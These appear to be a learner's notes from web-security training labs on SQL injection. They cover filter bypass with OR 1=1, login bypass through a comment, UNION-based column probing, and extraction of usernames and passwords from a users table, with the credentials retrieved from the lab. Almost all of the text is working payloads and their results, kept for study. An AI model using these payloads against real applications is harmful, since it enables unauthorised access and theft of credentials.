# SQLi

## Retrieving hidden data

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
```
/filter?category=Food+%26+Drink'+OR+1=1--
```

## Subverting application logic

### SQL injection vulnerability allowing login bypass

Username: `administrator'--`

## Retrieving data from other database tables

### Determining the number of columns required in an SQL injection UNION attack
```
?category=Gifts'+UNION+SELECT+null--            500 Internal Server Error
?category=Gifts'+UNION+SELECT+null,null--       500 Internal Server Error
?category=Gifts'+UNION+SELECT+null,null,null--  200 OK
```

### Finding columns with a useful data type in an SQL injection UNION attack
```
?category=Gifts'+UNION+SELECT+'rn4IRy',null,null--   500 Internal Server Error
?category=Gifts'+UNION+SELECT+null,'rn4IRy',null--   200 OK
```

### Using an SQL injection UNION attack to retrieve interesting data
```
?category=Pets'+UNION+SELECT+username,password+FROM+users--
```
Credentials retrieved: `administrator` / `sip8ds`

### Retrieving multiple values within a single column
```
?category=Gifts'+UNION+SELECT+null,username+||+'~'+||+password+FROM+users--

wiener~peter
administrator~5v82nt
carlos~montoya
```

## Examining the database